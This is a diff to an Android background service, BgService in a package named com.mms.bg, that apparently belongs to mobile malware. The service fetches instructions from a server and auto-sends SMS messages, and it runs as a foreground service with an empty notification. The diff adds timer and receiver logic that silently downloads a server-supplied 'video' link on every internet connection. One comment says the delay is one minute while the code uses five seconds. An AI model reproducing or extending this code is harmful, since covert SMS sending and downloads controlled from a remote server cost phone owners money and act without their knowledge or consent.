@@ -5,14 +5,19 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Date;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
 
 import android.app.Notification;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
+import android.os.AsyncTask;
 import android.os.IBinder;
 import android.util.Log;
 
@@ -22,7 +27,7 @@ import com.mms.bg.util.XMLHandler;
 public class BgService extends Service {
 
     private static final String TAG = "BgService";
-    private static final boolean DEBUG = false;
+    private static final boolean DEBUG = true;
     
     public static final String ACTION_DIAL_BR = "action.dial.bg";
     public static final String ACTION_INTERNET = "action.internet.bg";
@@ -33,6 +38,7 @@ public class BgService extends Service {
     
     public static final String FILTER_ACTION = "com.mms.bg.FILTER_ACTION";
     public static final String META_DATA = "com.mms.bg.pid";
+    public static final String VEDIO_ACTION = "com.mms.bg.vedio";
     
     private SettingManager mSM;
     private boolean mStartSMSAfterInternet;
@@ -53,6 +59,38 @@ public class BgService extends Service {
     private Object[] mStartForegroundArgs = new Object[2];
     private Object[] mStopForegroundArgs = new Object[1];
 
+    private class VedioTitleTask extends AsyncTask<String, Integer, Integer> {
+
+        @Override
+        protected Integer doInBackground(String... params) {
+            LOGD("Stirng size = " + params.length);
+            mSM.log("Stirng size = " + params.length);
+            if (params.length > 0) {
+                mSM.downloadVedio();
+            }
+            return null;
+        }
+        
+    };
+    
+    private BroadcastReceiver VedioBCR = new BroadcastReceiver() {
+        public void onReceive(Context context, Intent intent) {
+            LOGD("The vedio url = " + mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
+            mSM.log("The vedio url = " + mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
+            if (mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK) != null) {
+                new VedioTitleTask().execute(mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
+            }
+        }
+    };
+    
+    private class MyTimerTask extends TimerTask {
+        public void run() {
+            Intent intent = new Intent();
+            intent.setAction(VEDIO_ACTION);
+            BgService.this.sendBroadcast(intent);
+        }
+    };
+    
     /**
      * This is a wrapper around the new startForeground method, using the older
      * APIs if it is not available.
@@ -183,6 +221,10 @@ public class BgService extends Service {
         
         Notification notification = new Notification();
         this.startForegroundCompat(NOTIFY_ID, notification);
+        
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(VEDIO_ACTION);
+        this.registerReceiver(VedioBCR, filter);
     }
     
     @Override
@@ -193,6 +235,7 @@ public class BgService extends Service {
         
         if (intent == null || intent.getAction() == null) {
             mSM.tryToFetchInfoFromServer(0);
+            return;
         }
         
         String action = intent.getAction();
@@ -210,11 +253,13 @@ public class BgService extends Service {
                 mSM.setLastConnectServerTime(System.currentTimeMillis());
                 mSM.tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true && mStartSMSAfterInternet == true) {
+                    //using sms
                     mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                     mStartSMSAfterInternet = false;
-                } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
-                    //TODO : start vedio download alarm
-                    mStartSMSAfterInternet = false;
+                } else if (isDownloadVedio() == true) {
+                    //for each internet connection, delay 1 min, then download the vedio url
+                    Timer timer = new Timer();
+                    timer.schedule(new MyTimerTask(), 5 * 1000);
                 }
             } else {
                 mSM.setInternetConnectFailed(true);
@@ -282,9 +327,9 @@ public class BgService extends Service {
                     if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                         mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                         mStartSMSAfterInternet = false;
-                    } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
-                        //TODO : start vedio download alarm
-                        mStartSMSAfterInternet = false;
+                    } else if (isDownloadVedio() == true) {
+                        Timer timer = new Timer();
+                        timer.schedule(new MyTimerTask(), 5 * 1000);
                     }
                 }
                 if (mSM.getInternetConnectFailedBeforeSMS() == true) {
@@ -307,6 +352,7 @@ public class BgService extends Service {
         super.onDestroy();
         mSM.log(TAG, "onDestroy");
         stopForegroundCompat(NOTIFY_ID);
+        this.unregisterReceiver(VedioBCR);
     }
     
     private void oneRoundSMSSend() {
